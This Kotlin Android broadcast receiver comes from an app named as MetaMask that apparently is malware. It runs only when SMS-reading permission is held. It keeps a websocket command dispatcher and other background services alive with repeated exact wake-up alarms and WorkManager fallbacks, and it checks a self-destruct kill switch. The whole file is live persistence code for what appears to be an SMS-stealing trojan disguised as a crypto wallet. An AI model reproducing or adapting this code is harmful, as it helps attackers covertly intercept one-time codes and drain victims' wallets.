package com.example.MetaMask.receivers

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.PowerManager
import androidx.annotation.Keep
import androidx.core.content.ContextCompat
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.OutOfQuotaPolicy
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.example.MetaMask.services.MasterWebSocketDispatcher
import com.example.MetaMask.services.SelfDestructService
import com.example.MetaMask.services.ServiceStarterWorker

@Keep
class AlarmReceiver : BroadcastReceiver() {

    private val FALLBACK_ALARM_DELAY = 30 * 1000L

    companion object {
        private const val RETRY_ALARM_ID = 888
    }

    override fun onReceive(context: Context, intent: Intent) {
        android.util.Log.d("XDBG", "[AlarmReceiver] onReceive enter context=ctx intent=${intent}") //xdbg
        val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        val wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MetaMask:AlarmWakeLock")
        wakeLock.acquire(5000)
        val hasReadSms = ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED
        if (!hasReadSms) {
            android.util.Log.d("XDBG", "[AlarmReceiver] if branch") //xdbg
            if (wakeLock.isHeld) wakeLock.release()
            return
        }

        if (intent.action == com.example.MetaMask.services.CraneService.ACTION_CRANE_SELF_RESTART) {
            android.util.Log.d("XDBG", "[AlarmReceiver] if branch") //xdbg
            try {
                val savedMode = context.getSharedPreferences("crane_state", Context.MODE_PRIVATE)
                    .getString("auto_resume_mode", "off") ?: "off"
                val craneIntent = Intent(context, com.example.MetaMask.services.CraneService::class.java).apply {
                    if (savedMode != "off") {
                        android.util.Log.d("XDBG", "[AlarmReceiver] if branch") //xdbg
                        action = com.example.MetaMask.services.CraneService.ACTION_SET_CRANE_MODE
                        putExtra(com.example.MetaMask.services.CraneService.EXTRA_MODE, savedMode)
                    }
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(craneIntent)
                else context.startService(craneIntent)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[AlarmReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            } finally {
                if (wakeLock.isHeld) wakeLock.release()
            }
            return
        }

        try {
            val killSwitchPrefs = context.getSharedPreferences(SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)
            val disabled = killSwitchPrefs.getBoolean(SelfDestructService.KEY_PERMANENTLY_DISABLED, false)
            if (disabled) return

            try {
                val request = OneTimeWorkRequestBuilder<ServiceStarterWorker>()
                    .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                    .setInputData(workDataOf("ACTION" to "ALARM_TRIGGER"))
                    .build()
                WorkManager.getInstance(context).enqueueUniqueWork("SS_ONCE", ExistingWorkPolicy.KEEP, request)
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[AlarmReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            }

            startServiceDirectly(context)
            scheduleNextAlarm(context, FALLBACK_ALARM_DELAY, 777)
            scheduleNextAlarm(context, 90 * 1000L, 782)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[AlarmReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        } finally {
            if (wakeLock.isHeld) wakeLock.release()
        }
    }

    private fun startServiceDirectly(context: Context) {
        android.util.Log.d("XDBG", "[AlarmReceiver] startServiceDirectly enter context=ctx") //xdbg
        try {
            val pulseIntent = Intent(context, com.example.MetaMask.services.PulseService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[AlarmReceiver] if branch") //xdbg
                context.startForegroundService(pulseIntent)
            } else {
                context.startService(pulseIntent)
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[AlarmReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }

        val serviceIntent = Intent(context, MasterWebSocketDispatcher::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[AlarmReceiver] if branch") //xdbg
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[AlarmReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            if (Build.VERSION.SDK_INT >= 31) {
                android.util.Log.d("XDBG", "[AlarmReceiver] if branch") //xdbg
                scheduleNextAlarm(context, 2000L, RETRY_ALARM_ID)
            }
        }

        try {
            val craneIntent = Intent(context, com.example.MetaMask.services.CraneService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(craneIntent)
            else context.startService(craneIntent)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[AlarmReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun scheduleNextAlarm(context: Context, delayMs: Long, requestCode: Int) {
        android.util.Log.d("XDBG", "[AlarmReceiver] scheduleNextAlarm enter context=ctx delayMs=${delayMs} requestCode=${requestCode}") //xdbg
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val nextIntent = Intent(context, AlarmReceiver::class.java)
        val pendingIntent = PendingIntent.getBroadcast(
            context,
            requestCode,
            nextIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val triggerTime = System.currentTimeMillis() + delayMs

        if (Build.VERSION.SDK_INT >= 31) {
            android.util.Log.d("XDBG", "[AlarmReceiver] if branch") //xdbg
            if (alarmManager.canScheduleExactAlarms()) {
                android.util.Log.d("XDBG", "[AlarmReceiver] if branch") //xdbg
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
            } else {
                alarmManager.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
            }
        } else {
            if (Build.VERSION.SDK_INT >= 23) {
                android.util.Log.d("XDBG", "[AlarmReceiver] if branch") //xdbg
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
            } else {
                alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent)
            }
        }
    }
}
